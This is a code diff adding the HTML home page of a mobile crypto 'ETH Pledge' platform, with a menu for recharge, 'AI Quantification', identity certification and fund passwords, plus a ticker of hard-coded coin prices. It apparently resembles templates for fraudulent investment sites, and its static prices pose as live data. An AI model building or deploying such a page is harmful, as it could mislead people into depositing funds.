@@ -1,0 +1,2759 @@
+<!DOCTYPE html>
+<html style="font-size: 39.4px;">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0;" name="viewport" />
+    <title>ETH Pledge</title>
+    <link rel="icon" href="/lib/IMG/favicon.png">
+    <link href="/lib/bootstrap/dist/css/bootstrap.css" rel="stylesheet" />
+    <script src="/resource/font_2302506_w05z3emunp.js"></script>
+    <script src="/lib/bootstrap/dist/js/bootstrap.js"></script>
+    <link rel="stylesheet" href="/resource/font_2302506_w05z3emunp.css">
+    <script>
+        window.console.error = function () { }
+        window.console.log = () => { }
+        let plat_form_currency = 'BTC',
+            showDownload = true,
+            showCustomer = true,
+            showInvite = true,
+            showMobileRegister = true,
+            showVerifyCode = true,
+            showPostVerify = false,
+            defaultInvite = 'hkrg',
+            defaultCode = '9188',
+            ieoStart = "2021-08-16",
+            ieoEnd = "2021-11-16",
+            ieoStartPrice = "12 USDT",
+            showIEO = false;
+    </script>
+    <script src="/resource/jquery.min.js"></script>
+    <script src="/resource/bundle.js"></script>
+    <script src="/resource/charting_library.min.js"></script>
+    <script src="/resource/polyfills.js"></script>
+    <style type="text/css">
+        .icon {
+            width: 1em;
+            height: 1em;
+            vertical-align: -0.15em;
+            fill: currentColor;
+            overflow: hidden;
+        }
+
+        .u-margin-10,
+        .u-m-10 {
+            margin: 5px !important
+        }
+
+        uni-view {
+            display: block;
+            font-size: 12px;
+            line-height: inherit;
+            text-align: left
+        }
+
+        .follow-item-small[data-v-4e71be4a] {
+            font-size: 11px;
+            color: #777;
+            font-weight: 600
+        }
+
+        .support-card[data-v-4e71be4a] {
+            margin-top: 5px;
+            background-color: #fff;
+            width: 100%;
+            padding: 5px;
+            height: 110px;
+            background-image: url(/resource/financial_bg.png);
+            background-size: 100% 100%
+        }
+
+        .support-card .title[data-v-4e71be4a] {
+            color: #4069e7;
+            font-size: 16px
+        }
+
+        .support-card .sub-title[data-v-4e71be4a] {
+            color: #939393;
+            margin-top: 10px
+        }
+
+        .menu_footer {
+            /* bottom: 18px;
+                                                                                            right: 10px;
+                                                                                            position: absolute */
+            margin: 5px 0 20px 0;
+        }
+
+        header.mu-inverse.mu-elevation-4 {
+            background-color: #fff;
+        }
+
+        .night header.mu-inverse.mu-elevation-4 {
+            background-color: #102030;
+        }
+
+        .flex.pb10 {
+            background-color: #fff;
+        }
+
+        .night .flex.pb10 {
+            background-color: #102030;
+        }
+
+        .bold.tall.ft16.tab-group {
+            background-color: #fff;
+        }
+
+        .night .bold.tall.ft16.tab-group {
+            background-color: #0b1622;
+        }
+
+        div#coinListItem {
+            background-color: #fff;
+        }
+
+        .night div#coinListItem {
+            background-color: #102030;
+        }
+
+        h1.footMenuMining1 {
+            background-color: #f3f3f3 !important;
+            color: #000 !important;
+        }
+
+        .night h1.footMenuMining1 {
+            background-color: #0b1622 !important;
+            color: #fff !important;
+        }
+
+        .list-flow-dig .flex.flex-col.px-30.py-52 {
+            background-color: #fff;
+        }
+
+        .night .list-flow-dig .flex.flex-col.px-30.py-52 {
+            background-color: #102030;
+        }
+
+        h1.platformTitle {
+            background-color: #f3f3f3 !important;
+            color: #000 !important;
+        }
+
+        .night h1.platformTitle {
+            background-color: #0b1622 !important;
+            color: #fff !important;
+        }
+
+        .list-intro ul.flex.flex-col {
+            background-color: #fff;
+        }
+
+        .night .list-intro ul.flex.flex-col {
+            background-color: #102030;
+        }
+
+        h1.ContractTitle {
+            background-color: #f3f3f3;
+            color: #000;
+        }
+
+        h1.ContractTitle {
+            background-color: #f3f3f3 !important;
+            color: #000 !important;
+        }
+
+        .night h1.ContractTitle {
+            background-color: #0b1622 !important;
+            color: #fff !important;
+        }
+
+        .list-dept div {
+            background-color: #fff;
+            color: #000;
+            padding-top:10px;
+        }
+
+        .night .list-dept div {
+            background-color: #102030;
+            color: #fff;
+        }
+
+        .list-dept .flex.flex-col.flex-1.justify-center.items-center.border-r-grey, .list-dept .flex.Contract_text, .list-dept .flex.flex-col.flex-1.justify-center.items-center {
+            background-color: #2c78f8;
+        }
+
+        .flex.justify-center.items-center.mt {
+            background-color: #2c78f8;
+            color: #fff;
+        }
+
+        h1.PartnerTitle {
+            background-color: #f3f3f3 !important;
+            color: #000 !important;
+        }
+
+        .night h1.PartnerTitle {
+            background-color: #0b1622 !important;
+            color: #fff !important;
+        }
+
+        .list-partener ul.flex {
+            background-color: #fff;
+            padding-top: 10px;
+        }
+
+        .nigth .list-partener ul.flex {
+            background-color: #102030;
+        }
+    </style>
+    <!--<link href="https://ftx.us.com/mobile/js/about.cc17ec6e.js" rel="prefetch">-->
+    <link href="/resource/app.efd3cc41.css" rel="preload" as="style">
+    <link rel="stylesheet" href="/resource/swiper-bundle.min.css">
+    <link href="/resource/chunk-vendors.44a4056c.css" rel="preload" as="style">
+    <link href="/resource/app.88105f08.js" rel="preload" as="script">
+    <link href="/resource/chunk-vendors.3f066eab.js" rel="preload" as="script">
+    <link href="/resource/chunk-vendors.44a4056c.css" rel="stylesheet">
+    <link href="/resource/app.efd3cc41.css" rel="stylesheet">
+</head>
+
+<body style="">
+    <noscript>
+        <strong>
+            We're sorry but bbkmobile doesn't work properly without JavaScript enabled. Please enable it to
+            continue.
+        </strong>
+    </noscript>
+    <div id="app">
+        <div class="container-my container ftxPage">
+            <div class="home">
+                <div class="container-my">
+                    <header class="mu-inverse  mu-elevation-4">
+                        <div class="MuHeader">
+                            <!-- <button tabindex="0" type="button" class="mu-button mu-flat-button mu-icon-button " style="user-select: none; outline: none; appearance: none;" onclick="javascript:location.href='/Home/assets?a='">
+                                <div class="mu-button-wrapper">
+                                    <div class="mu-ripple-wrapper"></div>
+                                    <i class=" mu-icon  icon-fanhui4  " style="user-select: none;"></i>
+                                </div>
+                            </button> -->
+                            <div class="menu-top" id="open_menu">
+                                <div class="menu">
+                                    <img class="menu-w" src="/resource/list-top-w.png" />
+                                    <img class="menu-b" src="/resource/list-top-b.png" />
+                                </div>
+                            </div>
+                            <img src="/resource/logoi.png" alt="" class="HeahNavigation-login" style="display:none;">
+                            <div class="HeahNavigation-login-flex"></div>
+                            <div style="position: relative;display:none;" class="w-full-box">
+                                <div class="bg-secondary">
+                                    <div class="w-full">
+                                        <div class="w-full-img" value="">
+                                            <img src="/resource/trc.5b6c792.png" alt="">
+                                        </div>
+                                        <div class="w-full-icon" style="display:none;">
+                                            <img src="/resource/211687_down_arrow_icon.png" alt="">
+                                        </div>
+                                    </div>
+                                </div>
+                                <ul class="w-full-ul">
+                                    <li value="erc" style="display:none;">
+                                        <div style="display: flex;align-items: center;">
+                                            <div class="w-full-img">
+                                                <img src="/resource/ethereum.9df59bc.png" alt="">
+                                            </div>
+                                            <div>ERC20</div>
+                                        </div>
+                                        <div class="dot"></div>
+                                    </li>
+                                    <li value="trc">
+                                        <div style="display: flex;align-items: center;">
+                                            <div class="w-full-img">
+                                                <img src="/resource/trc.5b6c792.png" alt="">
+                                            </div>
+                                            <div>TRC20</div>
+                                        </div>
+                                        <div class="dot"></div>
+                                    </li>
+                                </ul>
+                            </div>
+                            <div class="connect-wallet" style="">ID:</div>
+                            <a class="jumplug" style="display:none;">
+                                <img src="/resource/lg.png" alt="">
+                            </a>
+                        </div>
+
+                        <!-- <div class="menu-top" id="open_menu"><div class="menu" style="margin:5px"><img src="~/resource/list-top.png"  /></div></div> -->
+                    </header>
+                    <div class="van-overlay" style="z-index: 2005;"></div>
+                    <div class="flex alcenter " style="padding-left: 5px;">
+                        <div class="mu-paper  mu-paper-round mu-elevation-16 mu-drawer"
+                             style="width: 80%; z-index: 20141260;border-radius: 0 15px 15px 0;">
+                            <!-- 新修改 -->
+                            <div style="position: relative;" class="night-overlay">
+                                <img class="vip-icon" src="/resource/1.png" alt="" style="position: absolute;
+								top: 30px;
+								left: 160px;
+								display:none;">
+                                <div style="text-align: left;">
+                                    <img class="f_btn" src="/resource/ff.png" alt="">
+                                </div>
+                                <div class="User-Info">
+                                    <h1>ID:</h1>
+                                    <div style="display: flex;align-items: center;">
+                                        <span style="display: flex;">
+                                            <span class="indexMoney">Asset Center</span><span>
+                                                <div class="selector">
+                                                    <div class="selectd">
+                                                        <span value="" class="MoenyName">
+                                                            <span></span>
+                                                            <span>
+                                                                <img src="/resource/down1.svg" alt="">
+                                                            </span>
+                                                        </span>
+                                                    </div>
+                                                    <ul>
+                                                        <li value="usdt">USDT</li>
+                                                        <li value="btc">BTC</li>
+                                                        <li value="eth">ETH</li>
+                                                        <li value="usdc">USDC</li>
+                                                        <span class="up-img"></span>
+                                                    </ul>
+                                                </div>
+                                            </span>
+                                        </span>
+                                        <span style="align-items: center;
+										display: flex">
+                                            <img class="info_img1" src="/resource/show.png" alt="">
+                                            <img class="info_img2" src="/resource/hide.png" alt="">
+                                        </span>
+                                    </div>
+                                    <p class="asset-usdt"></p>
+                                    <p class="asset-usdt2" style="display: none;">*******</p>
+                                    <div class="Wallet-function">
+                                        <div class="recharge fexCenterMenuQuick">
+                                            Recharge
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <ul class="mu-list">
+                                <!-- <div class=" container">
+                                    <li>
+                                        <a class="mu-item-wrapper" href=" /Home/ftx?a=">
+                                            <div class="mu-item    ">
+                                                <div class="mu-ripple-wrapper"></div>
+                                                <div class="mu-item-action  ">
+                                                    <div class="mu-avatar  "
+                                                        style="width: 22px; height: 22px; font-size: 10px;">
+                                                        <div class="mu-avatar-inner">
+                                                            <img src="~/resource/3643769_building_home_house_main_menu_icon.png">
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="mu-item-title">
+                                                    <div
+                                                        class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                        <div class="d-flex flex-row justify-content-start align-items-start flex-demo footMenuHome"
+                                                            style="width: 20%;">Home</div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </a>
+                                    </li>
+                                    <img class="right_btn" src="~/resource/right.png" alt="">
+                                </div> -->
+                                <div class="container1">
+                                <li>
+                                    <a class="mu-item-wrapper">
+                                        <div class="mu-item">
+                                            <div class="mu-ripple-wrapper"></div>
+                                            <div class="mu-item-action  ">
+                                                <div class="mu-avatar  "
+                                                     style="width: 22px; height: 22px; font-size: 10px;">
+                                                    <div class="mu-avatar-inner">
+                                                        <img src="/resource/kgc.png">
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="mu-item-title">
+                                                <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                    <div class="d-flex flex-row justify-content-start align-items-start flex-demo nightMode"
+                                                         style="width: 20%;">
+                                                        night mode
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </a>
+                                </li>
+                                <div class="mui-switch-btn">
+                                    <input class="mui-switch mui-switch-anim"
+                                           type="checkbox">
+                                </div>
+                        </div>
+                        <div class=" container">
+                            <li>
+                                <a class="mu-item-wrapper">
+                                    <div class="mu-item    ">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action  ">
+                                            <div class="mu-avatar  "
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/download-7.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo footMenuTrade"
+                                                     style="width: 20%;">
+                                                    Trade
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        <div class=" container">
+                            <li>
+                                <a class="mu-item-wrapper">
+                                    <div class="mu-item    ">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action  ">
+                                            <div class="mu-avatar  "
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/wa.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexLeftMenuMining"
+                                                     style="width: 20%;">
+                                                    AI Quantification
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                            <hr class=" mu-divider  shallow-inset">
+                        </div>
+                        <div class=" container">
+                            <li>
+                                <!-- <a class="mu-item-wrapper"
+                                    href=" /Home/Certification?a="> -->
+                                <div class="mu-item">
+                                    <div class="mu-ripple-wrapper"></div>
+                                    <div class="mu-item-action">
+                                        <div class="mu-avatar"
+                                             style="width: 22px; height: 22px; font-size: 10px;">
+                                            <div class="mu-avatar-inner">
+                                                <img src="/resource/download-16.png">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="mu-item-title">
+                                        <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                            <div class="d-flex flex-row justify-content-start align-items-start flex-demo  Primary"
+                                                 style="width: 20%;">
+                                                Primary certification
+                                            </div>
+                                            <div style="margin-left: 118px;font-size: 12px;"
+                                                 class="Primary_sta">
+                                                <span class="Certified" style="display: none;">Certified</span>
+                                                <span class="verifying" style="display: none;">verifying</span>
+                                                <span class="NotVerified" style="display: none;">
+                                                    Not
+                                                    Verified
+                                                </span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- </a> -->
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        <div class=" container">
+                            <li>
+                                <!-- <a class="mu-item-wrapper"
+                                    href=" /Home/CertificationTwo?a="> -->
+                                <div class="mu-item">
+                                    <div class="mu-ripple-wrapper"></div>
+                                    <div class="mu-item-action">
+                                        <div class="mu-avatar"
+                                             style="width: 22px; height: 22px; font-size: 10px;">
+                                            <div class="mu-avatar-inner">
+                                                <img src="/resource/download-17.png">
+                                            </div>
+                                        </div>
+                                    </div>
+                                    <div class="mu-item-title">
+                                        <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                            <div class="d-flex flex-row justify-content-start align-items-start flex-demo Advanced"
+                                                 style="width: 20%;">
+                                                Advanced authentication
+                                            </div>
+                                            <div style="margin-left: 118px;font-size: 12px;"
+                                                 class="Advanced_sta">
+                                                <span class="Certified" style="display: none;">Certified</span>
+                                                <span class="verifying" style="display: none;">verifying</span>
+                                                <span class="NotVerified" style="display: none;">
+                                                    Not
+                                                    Verified
+                                                </span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- </a> -->
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        <div class=" container">
+                            <li>
+                                <a class="mu-item-wrapper">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/download-15.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo footMenuAssets"
+                                                     style="width: 20%;">
+                                                    My Assets
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        <div class=" container" style="display:none">
+                            <li>
+                                <a class="mu-item-wrapper">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/yq.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexLeftMenuInvite"
+                                                     style="width: 20%;">
+                                                    Invite friends
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        <div class=" container" style="display:none;">
+                            <li>
+                                <a class="mu-item-wrapper">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/logo_EOS.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexLeftMenuSuper"
+                                                     style="width: 20%;">
+                                                    Super rebate
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        <!-- 新修改 -->
+                        <div class=" container">
+                            <li>
+                                <a class="mu-item-wrapper">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/lug.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexCenterMenuLanguage"
+                                                     style="width: 20%;">
+                                                    Language
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        <div class=" container">
+                            <li>
+                                <a class="mu-item-wrapper">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/help.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexCenterMenuHelp"
+                                                     style="width: 20%;">
+                                                    Help
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        <!-- <div class=" container">
+                            <li class="kefu">
+                                <a class="mu-item-wrapper kefu" href="javascript:void(0)" target="_blank">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="~/resource/1647225803794483.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div
+                                                class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexLeftMenuDaily"
+                                                    style="width: 20%;">Daily I.R. </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="~/resource/right.png" alt="">
+                        </div> -->
+                        <div class=" container">
+                            <li class="kefu">
+                                <a class="mu-item-wrapper kefu" href="javascript:void(0)">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/kf.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexCenterMenuService"
+                                                     style="width: 20%;">
+                                                    Service
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+
+
+
+                        <div class=" container">
+                            <li>
+                                <a class="mu-item-wrapper" id="termsServiceee">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/logo_EOS.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexLeftMenuTerms"
+                                                     style="width: 20%;">
+                                                    Terms of Service
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+
+                        <div class=" container" id="loginInnnn">
+                            <li>
+                                <a class="mu-item-wrapper">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/login-icon.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexLeftMenuLogin"
+                                                     style="width: 20%;">
+                                                    登录
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+
+                        <div class=" container" id="logOuttttttt">
+                            <li>
+                                <a class="mu-item-wrapper" href="/Home/index">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/logOut.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexLeftMenuLogOut"
+                                                     style="width: 20%;">
+                                                    登出
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+
+                        <div class=" container">
+                            <li>
+                                <a class="mu-item-wrapper"
+                                   href="/Home/register?a=">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/setpassword-icon.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo fexLeftMenuPassword"
+                                                     style="width: 20%;">
+                                                    设置密码
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        
+                        <div class=" container">
+                            <li>
+                                <a class="mu-item-wrapper"
+                                   href="/Home/ChangePwd?a=">
+                                    <div class="mu-item">
+                                        <div class="mu-ripple-wrapper"></div>
+                                        <div class="mu-item-action">
+                                            <div class="mu-avatar"
+                                                 style="width: 22px; height: 22px; font-size: 10px;">
+                                                <div class="mu-avatar-inner">
+                                                    <img src="/resource/setpassword-icon.png">
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="mu-item-title">
+                                            <div class="d-flex flex-row justify-content-start align-items-center flex-wrapper">
+                                                <div class="d-flex flex-row justify-content-start align-items-start flex-demo setFundPassword"
+                                                     style="width: 20%;">
+                                                    设置资金密码
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </a>
+                            </li>
+                            <img class="right_btn" src="/resource/right.png" alt="">
+                        </div>
+                        </ul>
+                        <div class="menu_footer" style="margin-top:60px;margin-left:-130px;display:none;">
+                            <span class="mu-item-title login "
+                                  onclick="javascript:location.href='/Home/login?a='">Login</span><span class="mu-item-title register fexLeftMenuPassword"
+                                                                                                                        onclick="javascript:location.href='/Home/register?a='">
+                                Set
+                                password
+                            </span><span class="mu-item-title logout ">Logout</span>
+                        </div>
+                    </div>
+                </div>
+                <div data-v-41bb2ad4="" data-mu-loading-color="primary"
+                     data-mu-loading-overlay-color="rgba(255, 255,255, .9)" class="demo-loading-wrap container"
+                     style="height: 100%; overflow: auto;">
+                    <div data-v-41bb2ad4="" class="wrap">
+                        <div data-v-41bb2ad4="">
+                            <div data-v-41bb2ad4=""
+                                 class="swiper-container swiper-container-initialized swiper-container-horizontal swiper-container-ios"
+                                 style="height: 150px;">
+                                <div class="swiper-wrapper"
+                                     style="transform: translate3d(-2190px, 0px, 0px); transition-duration: 0ms;">
+                                    <!-- 新修改 -->
+                                    <div data-v-41bb2ad4=""
+                                         class="swiper-slide swiper-slide-duplicate swiper-slide-duplicate-active jumpPool"
+                                         style=" width: 100%; height: auto; " data-swiper-slide-index="2">
+                                        <img data-v-41bb2ad4="" src="/resource/banner_3.png" style="width: 100%;  height: 100%;">
+                                    </div>
+                                    <div data-v-41bb2ad4=""
+                                         class="swiper-slide swiper-slide-duplicate-next jumpPool"
+                                         style="width: 100%;  height: auto; " data-swiper-slide-index="0">
+                                        <img data-v-41bb2ad4="" src="/resource/banner_1.png" style="width: 100%;  height: 100%;">
+                                    </div>
+                                    <div data-v-41bb2ad4="" class="swiper-slide swiper-slide-prev jumpPool"
+                                         style="width: 100%;  height: auto;" data-swiper-slide-index="1">
+                                        <img data-v-41bb2ad4="" src="/resource/banner_2.png" style="width: 100%; height: 100%;">
+                                    </div>
+                                    <div data-v-41bb2ad4="" class="swiper-slide swiper-slide-prev jumpPool"
+                                         style="width: 100%;  height: auto;" data-swiper-slide-index="3">
+                                        <img data-v-41bb2ad4="" src="/resource/banner_3.png" style="width: 100%; height: 100%;">
+                                    </div>
+                                </div>
+                                <div data-v-41bb2ad4="" class="swiper-pagination swiper-pagination-bullets">
+                                    <span class="swiper-pagination-bullet"></span>
+                                    <span class="swiper-pagination-bullet"></span>
+                                    <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
+                                </div>
+                                <span class="swiper-notification" aria-live="assertive" aria-atomic="true"></span>
+                            </div>
+                            <div class="hot_flex">
+                                <h1 class="HotTitle">HOT</h1>
+                                <div data-v-41bb2ad4="" class=" flex pb10">
+                                    <!-- 新修改 -->
+                                    <div data-v-41bb2ad4="" class="grid-item" id="bannerBTC"
+                                         onclick="javascript:location.href='/Home/trade?type=BTC&a='">
+                                        <div class="grid-item__content">
+                                            <div class="grid-item-list">
+                                                <span data-v-41bb2ad4="" style="font-size: 16px; font-weight: bold;"
+                                                      class="items-end">
+                                                    BTC<span data-v-4e71be4a=""
+                                                             class="follow-item-small">/USDT</span>
+                                                </span>
+                                                <img src="/resource/logo_BTC.png" alt="">
+                                            </div>
+                                            <span data-v-41bb2ad4="" class="green"
+                                                  style="font-weight: bold; font-size: 16px;">22374.88</span>
+                                            <!-- <br data-v-41bb2ad4=""> -->
+                                            <span data-v-41bb2ad4="" class="green">+1.19%</span>
+                                            <!-- <br data-v-41bb2ad4=""> -->
+                                        </div>
+                                    </div>
+                                    <div data-v-41bb2ad4="" class="grid-item" id="bannerETH"
+                                         onclick="javascript:location.href='/Home/trade?type=ETH&a='">
+                                        <div class="grid-item__content">
+                                            <div class="grid-item-list">
+                                                <span data-v-41bb2ad4="" style="font-size: 16px; font-weight: bold;"
+                                                      class="items-end">
+                                                    ETH<span data-v-4e71be4a=""
+                                                             class="follow-item-small">/USDT</span>
+                                                </span>
+                                                <img src="/resource/logo_ETH.png" alt="">
+                                            </div>
+                                            <span data-v-41bb2ad4="" class="green"
+                                                  style="font-weight: bold; font-size: 16px;">1721.31</span>
+                                            <!-- <br data-v-41bb2ad4=""> -->
+                                            <span data-v-41bb2ad4="" class="green">+0.89%</span>
+                                            <!-- <br data-v-41bb2ad4=""> -->
+                                        </div>
+                                    </div>
+                                    <div data-v-41bb2ad4="" class="grid-item" id="bannerXRP"
+                                         onclick="javascript:location.href='/Home/trade?type=XRP&a='">
+                                        <div class="grid-item__content">
+                                            <div class="grid-item-list">
+                                                <span data-v-41bb2ad4="" style="font-size: 16px; font-weight: bold;"
+                                                      class="items-end">
+                                                    XRP<span data-v-4e71be4a=""
+                                                             class="follow-item-small">/USDT</span>
+                                                </span>
+                                                <img src="/resource/logo_XRP.png" alt="">
+                                            </div>
+                                            <span data-v-41bb2ad4="" class="green"
+                                                  style="font-weight: bold; font-size: 16px;">0.35328</span>
+                                            <!-- <br data-v-41bb2ad4=""> -->
+                                            <span data-v-41bb2ad4="" class="green">+0.16%</span>
+                                            <!-- <br data-v-41bb2ad4=""> -->
+                                        </div>
+                                        <!-- <span data-v-41bb2ad4=""
